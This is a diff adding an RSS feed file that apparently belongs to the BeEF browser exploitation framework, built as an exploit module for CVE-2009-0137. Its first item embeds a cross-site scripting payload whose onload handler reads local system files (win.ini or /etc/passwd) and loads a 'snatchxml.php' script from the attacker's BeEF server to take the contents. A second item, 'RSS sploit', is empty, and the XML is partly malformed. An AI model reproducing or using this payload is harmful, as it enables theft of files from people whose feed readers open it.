@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" 
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	>
+
+<channel>
+	<title>Local XSS</title>
+	<link>http://www.bindshell.net</link>
+	<description>BeEF Browser Exploitation Framework</description>
+
+		<item>
+		<title>BeEF module</title>
+
+			<content:encoded><![CDATA[
+
+<body src="/beef/images/beef.gif" onload="javascript:;
+var req;
+var req_file;
+if (/Windows/.test(navigator.userAgent)) {
+	req_file='file:///c:/windows/win.ini'
+} else {
+	req_file='file:////etc/passwd'
+};
+req = new XMLHttpRequest();
+req.onreadystatechange = processReqChange;
+req.open('GET', req_file, true);
+req.send('');
+	function processReqChange() {
+		if (req.readyState == 4) { 
+			file_content = req.responseText;
+			result_id=document.location.hash.substr(1,document.cookie.length);
+			beef_url = 'http://' + document.location.host + '/beef/';
+			var html_doc = document.getElementsByTagName('head').item(0);
+			var js = document.createElement('script');
+			js.src = beef_url + 'modules/browser/xplt_cve_2009_0137/snatchxml.php';
+			js.type = 'text/javascript';
+			html_doc.appendChild(js);
+		}
+	}" <onload=""
+]]>
+
+</content:encoded>
+
+		</item>
+<title>Local XSS</title>
+        <link>http://www.bindshell.net</link>
+        <description>none</description>
+
+                <item>
+                <title>RSS sploit</title>
+
+                        <content:encoded><![CDATA[
+
+
+]]>
+
+</content:encoded>
+
+
+                </item>
+
+
+	</channel>
+</rss>
